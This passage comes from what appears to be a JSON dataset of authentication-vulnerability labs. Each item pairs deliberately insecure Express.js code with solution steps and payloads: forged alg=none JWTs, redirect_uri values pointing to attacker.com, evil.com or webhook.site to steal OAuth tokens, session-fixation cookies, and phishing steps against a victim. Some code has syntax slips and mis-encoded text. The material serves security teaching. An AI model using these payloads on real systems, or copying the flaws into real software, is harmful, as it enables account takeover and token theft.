      "1. Use OWASP ZAP to intercept and explore the OAuth login flow initiated by the victim.",
      "2. Identify the request URL that contains the redirect_uri and state parameters.",
      "3. Modify the redirect_uri to point to your controlled OAuth identity and remove the state parameter entirely.",
      "4. Send the crafted link to the OAuth endpoint with Carlos's session token attached (stolen or guessed via browser cache/sniffing).",
      "5. After the system binds your OAuth identity to Carlos\u00e2\u20ac\u2122s account, access the victim dashboard directly."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = {}; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=xyz`); }); app.get('/callback', (req, res) => { const { code, user } = req.query;  users[user] = { oauthBound: true }; res.send(`OAuth bound to ${user}`); }); app.get('/dashboard', (req, res) => { const { user } = req.query; if (users[user]?.oauthBound) res.send(`Welcome ${user}, your OAuth is active.`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "https://target.com/auth?redirect_uri=https://attacker.com/callback&user=carlos",
      "https://target.com/callback?code=xyz&user=carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The application uses predictable session IDs and does not invalidate the session token after login. This allows an attacker to set a session ID before victim login and later hijack the session. To solve: Fixate the session ID before Carlos logs in, then reuse that session ID to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to initiate a login process without submitting credentials to obtain a session ID from the Set-Cookie header.",
      "2. Send a phishing link with the fixed session ID cookie to Carlos.",
      "3. Once Carlos logs in, intercept and reuse the same session ID.",
      "4. Replay the session using the cookie to access the /my-account endpoint.",
      "5. Confirm access by viewing Carlos\u00e2\u20ac\u2122s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('Session Fixation Lab running on http://localhost:5000'));",
    "payloads": [
      "Set-Cookie: sid=12345; path=/",
      "Reuse sid=12345 after victim logs in",
      "Access /my-account with Cookie: sid=12345"
    ]
  },
  {
    "Lab scenario": "Session fixation via cookie injection in login workflow",
    "Lab Description": "The application does not invalidate user sessions upon authentication. Instead, it continues using any pre-authenticated session identifier, even if it was injected beforehand. The application uses cookie-based sessions without regeneration upon login. To solve: Hijack a session by fixing a session ID before victim login and access Carlos's account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a GET /login request and inject a crafted session cookie (e.g., sessionid=attacker1234). Forward the request.",
      "2.Share a phishing link with Carlos pointing to the login page. Carlos logs in while the sessionid=attacker1234 is already set.",
      "3.After Carlos logs in, the application does not regenerate the session ID and continues using the fixed value.",
      "4.Use the same session ID (attacker1234) in your browser and send a GET /my-account request.",
      "5.If successful, Carlos\u00e2\u20ac\u2122s authenticated session will be accessible using the fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { let sid = req.cookies.sessionid || 'guest'; res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><input type='hidden' name='sid' value='${sid}'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password, sid } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.cookie('sessionid', sid); res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Carlos account details'); res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab on port 3000'));",
    "payloads": [
      "sessionid=attacker1234",
      "Injected session cookie before login",
      "Phishing link with pre-set cookie"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm exploit in Authorization header",
    "Lab Description": "The backend uses JWT tokens for stateless authentication, but fails to enforce a valid algorithm for signature verification. If a token is submitted with the 'alg' field set to 'none', the backend accepts it without validating the signature. To solve: Forge a valid token for Carlos using the 'none' algorithm and access his protected resource.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp Suite or Postman to intercept a request with a valid JWT in the Authorization header.",
      "2.Decode the token using jwt.io or a custom script and extract the payload and header.",
      "3.Modify the header to set 'alg' to 'none' and set the payload to {\"username\": \"carlos\"}.",
      "4.Remove the signature part entirely and reconstruct the JWT as header.payload.",
      "5.Send the forged token in the Authorization header and access GET /account.",
      "6.Confirm successful bypass by verifying Carlos\u00e2\u20ac\u2122s account details are visible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') { return res.send('Carlos account accessed'); } else { return res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Exploit Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [header].[payload].",
      "JWT with alg=none, no signature"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant token leakage via referrer",
    "Lab Description": "This lab implements OAuth 2.0 using the implicit grant flow. Access tokens are returned in the URL fragment, but a redirect leads to a third-party domain which leaks the token via the Referer header. To solve: Extract Carlos\u00e2\u20ac\u2122s access token from a leaked Referer and use it to access his data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP to passively scan and identify OAuth redirect flows in the login mechanism.",
      "2.Trigger an OAuth login using your own account and observe the redirection chain. Note where the access_token appears in the URL.",
      "3.Observe that after the redirect, the application sends the user to a third-party analytics subdomain, leaking the fragment in the Referer header.",
      "4.Set up a listener or check browser dev tools to capture the Referer header containing Carlos\u00e2\u20ac\u2122s token.",
      "5.Use the stolen token to craft an Authorization: Bearer header and send a request to GET /api/user-info.",
      "6.Verify access to Carlos\u00e2\u20ac\u2122s protected data using the token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { const html = `<script>location.href='https://analytics.lab.com/track?ref='+document.location.href</script>`; res.send(html); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') return res.send('Sensitive data for Carlos'); res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Token Leakage Lab running on port 3000'));",
    "payloads": [
      "https://oauth-provider.com/callback#access_token=carlos-access-token",
      "Referer: https://analytics.lab.com/track?ref=https://callback#access_token=carlos-access-token",
      "Authorization: Bearer carlos-access-token"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm exploit in session verification",
    "Lab Description": "The application uses JWTs to manage authenticated sessions, but it incorrectly allows tokens with the 'alg':'none' header to be accepted as valid. The application verifies tokens without validating the signature when 'none' is specified. To solve: forge a valid session token for the user 'admin' and access the admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the login request using Burp Suite and inspect the JWT token returned in the Set-Cookie header.",
      "Copy the token to jwt.io and decode it. Observe the structure and headers. Notice the alg is set to HS256.",
      "Modify the JWT header to use 'alg':'none' and set the payload to {\"username\":\"admin\"}. Remove the signature part of the token.",
      "In Burp, replace the session cookie in a request to /admin with the modified unsigned JWT and send the request.",
      "If successful, the admin dashboard is displayed. Confirm by observing admin-only features or messages."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const secret = 'supersecret'; app.get('/login', (req, res) => { const token = jwt.sign({ username: 'user' }, secret); res.cookie('session', token); res.send('Logged in'); }); app.get('/admin', (req, res) => { try { const token = req.cookies.session; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Exploit Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This application does not regenerate session cookies after login. An attacker can set a session ID before login and trick the victim into logging in with it, allowing session fixation. To solve: fixate Carlos's session and access their profile using the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit /login and inspect the cookie set before login. Note the 'session' cookie is issued pre-auth.",
      "Use a tool like Postman to set a session cookie manually before login.",
      "Send a crafted link to Carlos with the session cookie already injected via a custom header or Burp's proxy.",
      "After Carlos logs in, reuse the same session ID to access /profile.",
      "Verify successful access to Carlos's profile and account information."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.session || Math.random().toString(36); res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\" /></form>'); }); app.post('/login', (req, res) => { const username = req.query.username; const sid = req.cookies.session; sessions[sid] = username; res.send('Logged in'); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Carlos profile data'); else res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Set-Cookie: session=attackerSessionID;",
      "GET /login HTTP/1.1\\nCookie: session=attackerSessionID",
      "Manually inject session=attackerSessionID into Burp\u00e2\u20ac\u2122s cookie editor before victim logs in"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referrer header in implicit flow",
    "Lab Description": "The app implements OAuth using the implicit grant type and returns access tokens in the URL fragment. Due to misconfigured redirects, tokens are leaked through the referrer header when loading external resources. To solve: capture an access token for the victim and use it to access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a Burp Collaborator payload or webhook.site URL to craft an OAuth redirect_uri pointing to your domain.",
      "Send the link to the victim (Carlos) to simulate clicking an OAuth login.",
      "When Carlos logs in, observe that the access_token is returned in the URL fragment.",
      "Due to misconfiguration, a subsequent redirect or resource request includes this token in the Referrer header.",
      "Intercept the request to your server, extract the leaked token, and use it in a Bearer Authorization header to access Carlos\u00e2\u20ac\u2122s profile via the API."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token123-carlos' }; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token123-carlos') { res.send('Sensitive data for Carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000, () => console.log('OAuth Token Leak Lab running on port 5000'));",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://webhook.site/your-custom-id",
      "GET /profile HTTP/1.1\\nAuthorization: Bearer token123-carlos",
      "Observe Referrer header leakage in requests from victim to external domains"
    ]
  },
  {
    "Lab scenario": "JWT signature spoofing via alg=none in REST API login",
    "Lab Description": "The application uses JWTs to manage user sessions, but incorrectly allows the use of the 'none' algorithm. The `/api/login` endpoint accepts a username and password, returning a signed JWT. However, the server fails to validate the JWT signature properly when `alg` is set to `none`. The application treats the payload as valid without verifying the signature. To solve: forge a JWT that grants access to Carlos\u00e2\u20ac\u2122s account using the `alg=none` technique.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp Suite to log in as a regular user and capture the JWT from the `/api/login` response.",
      "Decode the JWT using jwt.io and inspect its header and payload to observe the `HS256` algorithm and user claim.",
      "Modify the JWT header to set `alg` to `none` and change the payload `username` claim to `carlos`.",
      "Remove the signature section entirely and base64 encode the new header and payload, joining them with a dot.",
      "Send the modified JWT as a bearer token to `/api/my-account` and verify if access to Carlos\u00e2\u20ac\u2122s data is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }, { username: 'wiener', password: 'p@ssword' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); const token = jwt.sign({ username: user.username }, 'supersecretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload?.header?.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'carlos') return res.send('Sensitive data for carlos'); } else { try { const verified = jwt.verify(token, 'supersecretkey'); if (verified.username === 'carlos') return res.send('Sensitive data for carlos'); } catch (e) { return res.status(403).send('Forbidden'); } } res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
      "header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking access token via redirect",
    "Lab Description": "The application integrates a third-party OAuth provider for login using the `response_type=token` flow. However, it redirects the full access token to a third-party endpoint using an insecure redirect URI. This allows an attacker to intercept tokens by registering a malicious domain. To solve: craft a redirect URI pointing to a server you control and extract Carlos\u00e2\u20ac\u2122s access token upon login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a request logger (e.g., requestbin, Burp Collaborator) to collect access token leaks.",
      "Inspect the OAuth login request and note the redirect_uri parameter vulnerability (no allowlist).",
      "Craft a malicious OAuth authorization URL with `redirect_uri` set to your logging endpoint and `response_type=token`.",
      "Send the URL to Carlos via phishing or social engineering to induce login via the vulnerable flow.",
      "Capture the access token from the request sent to your server and use it to access `/oauth/account` with an Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token') { const token = Buffer.from('access-token-for-carlos').toString('base64'); return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid flow'); }); app.get('/oauth/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Buffer.from(token, 'base64').toString() === 'access-token-for-carlos') return res.send('OAuth Account Data: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://malicious.example.com#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M=",
      "https://attacker.site#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M=",
      "https://requestbin.net/#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M="
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in GraphQL login",
    "Lab Description": "This application exposes a GraphQL endpoint for user authentication. Upon visiting the site, a fixed session cookie is assigned regardless of user identity. The server does not invalidate or regenerate the session after login, allowing a malicious user to predetermine a victim's session ID. To solve: predefine Carlos\u00e2\u20ac\u2122s session ID, get him to log in using it, then hijack the session and access his dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the session management behavior before and after login at `/graphql`.",
      "Notice that session cookies are not changed on successful login.",
      "Force the application to issue a fixed session ID (e.g., sessionid=attacker1234) by sending a crafted request as a guest.",
      "Convince Carlos to authenticate using the session cookie you created (e.g., via phishing link or XSS).",
      "Once logged in, reuse the session cookie to access `/graphql` as Carlos and extract account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); let sessions = {}; app.post('/graphql', (req, res) => { const session = req.cookies.sessionid || 'guest-' + Math.random().toString(36).substr(2); res.cookie('sessionid', session); const query = req.body.query; if (query.includes('login')) { const { username, password } = JSON.parse(query.match(/\\{.*\\}/)[0]); if (username === 'carlos' && password === 'hunter2') { sessions[session] = 'carlos'; return res.send({ data: { login: true } }); } return res.send({ data: { login: false } }); } else if (query.includes('dashboard')) { if (sessions[session] === 'carlos') return res.send({ data: { account: 'carlos profile' } }); return res.status(403).send({ error: 'Not authenticated' }); } res.send({ data: {} }); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=attacker1234",
      "GraphQL login mutation with credentials: { login(username: \"carlos\", password: \"hunter2\") }",
      "GraphQL query with sessionid=attacker1234: { dashboard { account } }"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth flow",
    "Lab Description": "The application uses OAuth for third-party login integration, but it fails to regenerate the session identifier after authentication. The application stores session tokens in cookies without proper rotation. To solve: Fixate your own session ID before login, then coerce the victim (Carlos) to authenticate via OAuth and capture their session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and intercept the login process via OAuth. Capture your session cookie before initiating authentication.",
      "Send the OAuth login initiation request to Burp Repeater. Note the session ID cookie (e.g., session=abc123).",
      "Craft a phishing link pointing to /auth/redirect with your fixated session cookie set. Trick Carlos into clicking it.",
      "Once Carlos completes the OAuth login flow, his session will be bound to your session ID.",
      "Use the captured session to access Carlos's /my-account page and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); app.get('/auth/redirect', (req, res) => { const user = { username: 'carlos' }; req.session.user = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account page for ${req.session.user.username}`); else res.status(403).send('Not authorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Phishing URL: /auth/redirect with session=abc123",
      "Cookie injection: session=abc123 before login",
      "OAuth flow replay using fixated session"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via algorithm confusion",
    "Lab Description": "This lab implements JWT-based authentication using the 'HS256' algorithm. However, the server fails to validate the token's algorithm field. To solve the lab, forge a JWT using the 'none' algorithm and access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in with your own credentials and intercept the issued JWT using Burp.",
      "Decode the JWT at jwt.io and observe the algorithm field in the header.",
      "Replace the algorithm with 'none' and change the payload to { \"username\": \"carlos\" }.",
      "Remove the JWT signature completely.",
      "Replay the modified unsigned JWT to access the protected /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('No token'); const payload = jwt.decode(token.replace('Bearer ', '')); req.user = payload; next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username === 'carlos') res.send('Welcome to Carlos's account'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}",
      "Unsigned JWT token: base64(header).base64(payload).",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Multi-step credential stuffing with email discovery",
    "Lab Description": "This lab simulates a login form that leaks registered emails through the password reset feature. The login system does not implement account lockout, allowing credential stuffing attacks. To solve the lab, enumerate Carlos's email, then brute-force his password and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the POST /forgot endpoint. Submit various usernames and capture variations in the response (e.g., 200 OK vs 404).",
      "Confirm Carlos's email/username is valid by analyzing the response behavior.",
      "Send POST /login request to Burp Intruder. Add a position marker around the password field.",
      "Load a large password list and configure Intruder to use grep match for successful logins (e.g., 302 redirect).",
      "Once successful login credentials are found, access Carlos's /my-account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ email: 'carlos@example.com', password: 'dragon' }]; app.post('/forgot', (req, res) => { const { email } = req.body; const user = users.find(u => u.email === email); if (user) res.send('Reset link sent'); else res.status(404).send('User not found'); }); app.post('/login', (req, res) => { const { email, password } = req.body; const user = users.find(u => u.email === email && u.password === password); if (user) res.redirect('/my-account'); else res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { res.send('Carlos account page'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Credential Stuffing Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "POST /forgot with carlos@example.com",
      "Intruder password list: rockyou.txt",
      "Credential combo: carlos@example.com:dragon",
      "Grep match: 302 redirect or presence of 'My account'"
    ]
  },
  {
    "Lab scenario": "JWT signature spoofing via 'none' algorithm in stateless API",
    "Lab Description": "The stateless REST API uses JSON Web Tokens (JWTs) for authentication but fails to validate the 'alg' field correctly. The backend trusts the token header and doesn't enforce algorithm restrictions. The application decodes JWTs without verifying the signature if the algorithm is set to 'none'. To solve: Forge a valid admin token and access the /admin-dashboard endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to log in and intercept the Authorization: Bearer <JWT> header for a regular user.",
      "Copy the JWT and decode it using jwt.io to observe the 'alg' field and payload structure.",
      "Replace 'alg' value in header with 'none', and change payload role to 'admin'. Remove signature part.",
      "Send modified JWT using Postman with Authorization header to /admin-dashboard endpoint.",
      "Verify successful access by retrieving sensitive data from the admin panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }, { username: 'wiener', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Invalid user'); const token = jwt.sign({ username: user.username, role: user.role }, 'supersecret'); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.role === 'admin') { return res.send('Welcome to the admin panel'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via unregenerated session ID after login",
    "Lab Description": "This web application accepts a user-provided session ID via the Cookie header. Upon successful login, the server does not regenerate the session ID, enabling session fixation. To solve: Fixate Carlos\u00e2\u20ac\u2122s session ID before he logs in, then use that session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy login and observe that session cookies are accepted from clients pre-auth.",
      "Craft a GET / request with Cookie: sessionId=fixed123 and confirm the same session persists after login.",
      "Convince Carlos to log in using a shared session (e.g., a phishing link or reflected XSS vector).",
      "Once Carlos logs in, reuse the fixed123 session ID to access /my-account.",
      "Validate success by retrieving account details of Carlos from /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sessionId || 'guest'; res.cookie('sessionId', sid); res.send('Welcome guest'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionId; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username === 'carlos') res.send('Sensitive account info for Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionId=fixed123",
      "POST /login with Cookie: sessionId=fixed123 and credentials for carlos",
      "GET /my-account with Cookie: sessionId=fixed123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking access_token to referrer",
    "Lab Description": "This application uses OAuth for login with an external provider but fails to correctly isolate the access_token from insecure referrer leaks. When redirected after authentication, the token is included in the URL fragment which gets exposed in referrer headers. To solve: Harvest Carlos's OAuth token and use it to impersonate him via the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate OAuth login and capture the redirect containing the token in the fragment.",
      "Host a malicious iframe endpoint and trick Carlos into clicking a link to the login page.",
      "Monitor the referrer header on your malicious domain to leak the OAuth access_token.",
      "Replay the stolen access_token using Postman to access GET /api/user-info.",
      "Confirm access by retrieving Carlos's personal data from the API."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { data: 'Carlos personal data' } }; const tokens = { 'valid-token-carlos': 'carlos' }; app.get('/login/oauth-callback', (req, res) => { const token = req.query.token; res.redirect(`https://target-app.com/#access_token=${token}`); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const username = tokens[token]; if (username) { res.json({ user: username, data: users[username].data }); } else { res.status(403).json({ error: 'Invalid token' }); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running'));",
    "payloads": [
      "https://target-app.com/#access_token=valid-token-carlos",
      "GET /api/user-info with Authorization: Bearer valid-token-carlos",
      "<iframe src='https://target-app.com/login/oauth-callback?token=valid-token-carlos'></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in Authorization header",
    "Lab Description": "This lab uses JWTs for stateless session handling and verifies tokens in the Authorization header using the 'alg' field. The server trusts the algorithm declared in the JWT itself. The application uses asymmetric signing (RS256) but fails to enforce key verification. To solve: forge a valid JWT that grants admin privileges by exploiting the algorithm confusion.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to log in and capture the JWT issued in the Authorization header for a low-privileged user.",
      "In Burp Decoder, decode the JWT and observe the 'alg':'RS256' header and user role 'user'.",
      "Craft a new JWT header with 'alg':'HS256' and sign it using the public key as the HMAC secret.",
      "Change payload to set role:'admin'. Sign the modified token using HMAC with the public key as the key.",
      "Replace the original token in the Authorization header with the forged one and access /admin endpoint to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); const users = [{ username: 'user', password: 'userpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('Token required'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') return res.send('Welcome Admin'); return res.status(403).send('Insufficient privileges'); } catch (err) { return res.status(400).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.<HMAC-SHA256-signature-using-public-key>",
      "{ \"alg\": \"HS256\" }.{ \"username\": \"admin\", \"role\": \"admin\" }.<signed>",
      "Authorization: Bearer <forged-token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
    "Lab Description": "The application allows users to authenticate via a third-party OAuth provider. However, it improperly validates the redirect_uri parameter, making it susceptible to open redirect-based token leakage. To solve: intercept the OAuth flow and steal an authorization code intended for another user, then exchange it for an access token and log in as that user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the login page and click 'Log in with OAuthProvider' to observe the redirect URL pattern.",
      "Use Burp Suite to intercept the redirect_uri parameter and modify it to point to your server (e.g., http://evil.com/callback).",
      "Host a listener on your server using Python\u00e2\u20ac\u2122s http.server module to capture the leaked code.",
      "Use the stolen authorization code with Postman to POST to the /oauth/token endpoint and exchange it for an access_token.",
      "Use the access_token in the Authorization header to access the victim's account endpoint."
    ],
